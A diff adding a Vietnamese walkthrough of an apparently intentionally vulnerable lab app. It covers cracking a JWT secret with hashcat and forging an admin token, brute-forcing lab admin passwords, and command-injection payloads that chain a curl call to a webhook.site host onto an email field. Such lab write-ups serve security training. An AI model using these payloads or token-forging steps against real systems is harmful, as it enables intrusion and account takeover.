@@ -31,9 +31,45 @@ Mở Kali Linux, sử dụng hashcat:
 
 `hashcat -m 16500 -a 0 <token> <wordlist>`
 
+=> Secretkey là `changeme`
+
+![image](https://github.com/user-attachments/assets/bb95b04c-9914-48b7-bd48-13657e9d8792)
+
+Từ secretkey này + token, vào trang jwt.io để chỉnh các thông tin để vào được tài khoản admin
+
+Nếu status của JWT là No thì sẽ được cấp secretkey phức tạp
+
+![image](https://github.com/user-attachments/assets/946bbc90-34f4-4a38-b48c-508c933d17e4)
+
 
 ### Command Injection
 
+Lỗ hổng này xảy ra ở chức năng subscribe
 
+![image](https://github.com/user-attachments/assets/90868d37-037b-43ae-9953-065d2f82f492)
+
+![image](https://github.com/user-attachments/assets/49f817bc-a19c-4857-80cf-0938f6050cf6)
+
+Payload
+
+__Windows__
+
+```
+attacker@example.com & C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe curl https://webhook.site/8bab6bcd-4a1b-4735-a2e1-5139468d7126 & echo hacked
+```
+
+__MacOS/Linux__
+
+```
+attacker@example.com & curl https://webhook.site/8bab6bcd-4a1b-4735-a2e1-5139468d7126 & echo hacked
+```
 
 ### Authentication
+
+Lỗ hổng này tập trung vào việc bruteforce mật khẩu của tài khoản admin
+
+Tk: `admin@example.com`
+
+Mk: `123456`
+
+Nếu mode No của Authentication: Mk: `H@123456`
